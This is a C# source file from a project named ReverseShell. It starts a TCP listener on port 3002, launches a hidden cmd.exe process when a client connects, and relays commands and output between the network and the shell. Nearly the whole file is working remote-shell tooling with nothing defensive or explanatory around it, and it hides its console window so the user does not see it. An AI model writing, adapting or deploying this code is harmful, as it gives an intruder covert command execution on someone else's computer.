using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ReverseShell
{
    static class Program
    {
        private static Process _process;
        private static INetService _netService;


        private static byte[] BufferOut { get; set; } = new byte[1024];
        private static byte[] BufferErr { get; set; } = new byte[1024];

        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            // Application.EnableVisualStyles();
            // Application.SetCompatibleTextRenderingDefault(false);
            // Application.Run(new Form1());


            _netService = new TcpSyncNetService();
            ((TcpSyncNetService) _netService).Connected +=
                new TcpSyncNetService.ConnectedHandler(OnConnected);

            ((TcpSyncNetService) _netService).OutputDataReceived +=
                new TcpSyncNetService.LineReceivedHandler(OnInputAvailable);

            ((TcpSyncNetService) _netService).ClientDisconnected += OnClientDisconnected;

            _netService.Start(IPAddress.Loopback, 3002);
        }

        private static void OnConnected()
        {
            _process = new Process();
            _process.StartInfo.FileName = "cmd";
            _process.StartInfo.Arguments = "";
            _process.StartInfo.CreateNoWindow = true;
            _process.StartInfo.UseShellExecute = false;
            _process.StartInfo.RedirectStandardOutput = true;
            _process.StartInfo.RedirectStandardInput = true;
            _process.StartInfo.RedirectStandardError = true;

            _process.Start();

            _process.StandardOutput.BaseStream.BeginRead(BufferOut, 0, BufferOut.Length, OnOutputAvailable,
                _process.StandardOutput);
            _process.StandardError.BaseStream.BeginRead(BufferErr, 0, BufferErr.Length, OnErrorAvailable,
                _process.StandardError);

            _netService.ReadSync();
        }

        private static void OnClientDisconnected()
        {
            _netService.Shutdown();
            _process.Close();
        }

        private static void OnInputAvailable(string line)
        {
            _process.StandardInput.WriteLine(line);
            _process.StandardInput.Flush();
        }

        private static void OnOutputAvailable(IAsyncResult ar)
        {
            lock (ar.AsyncState)
            {
                StreamReader processStream = ar.AsyncState as StreamReader;
                int numberOfBytesRead = processStream.BaseStream.EndRead(ar);

                if (numberOfBytesRead == 0)
                {
                    return;
                }

                string output = Encoding.UTF8.GetString(BufferOut, 0, numberOfBytesRead);
                Console.Write(output);
                Console.Out.Flush();

                processStream.BaseStream.BeginRead(BufferOut, 0, BufferOut.Length, OnOutputAvailable, processStream);

                _netService.Write(output);
            }
        }

        private static void OnErrorAvailable(IAsyncResult ar)
        {
            lock (ar.AsyncState)
            {
                StreamReader processStream = ar.AsyncState as StreamReader;
                int numberOfBytesRead = processStream.BaseStream.EndRead(ar);


                if (numberOfBytesRead == 0)
                {
                    return;
                }

                string output = Encoding.UTF8.GetString(BufferErr, 0, numberOfBytesRead);
                Console.Write(output);
                Console.Out.Flush();

                processStream.BaseStream.BeginRead(BufferErr, 0, BufferErr.Length, OnErrorAvailable, processStream);

                _netService.Write(output);
            }
        }
    }
}